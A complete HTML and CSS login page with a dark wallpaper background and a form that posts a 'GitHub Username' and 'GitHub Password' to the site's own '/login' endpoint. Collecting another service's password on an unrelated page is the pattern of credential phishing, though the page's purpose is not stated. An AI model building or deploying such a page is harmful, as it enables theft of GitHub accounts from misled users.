<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            background-image: url('https://images.wallpapersden.com/image/download/tree-alone-dark-evening-4k_bWZpam2UmZqaraWkpJRobWllrWdma2U.jpg');
            background-size: cover;
            background-position: center;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        .login-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 8px;
            width: 300px;
            text-align: center;
        }

        .login-container h2 {
            background-color: rgb(75, 227, 181); /* Green background for the text label */
            color: white;
            padding: 10px;
            margin: 0 0 20px 0;
            border-radius: 4px;
            font-size: 20px; /* Match the font size for label and inputs */
        }

        input[type="text"], input[type="password"], input[type="submit"] {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            font-size: 16px; /* Uniform font size for inputs */
        }

        input[type="submit"] {
            background-color: rgb(75, 227, 181); /* Green button color */
            color: white;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: rgb(55, 205, 160); /* Slightly darker green on hover */
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login Here</h2>
        <form action="/login" method="POST">
            <input type="text" id="username" name="username" placeholder="GitHub Username" required><br>
            <input type="password" id="password" name="password" placeholder="GitHub Password" required><br>
            <input type="submit" value="Login">
        </form>
    </div>

</body>
</html>
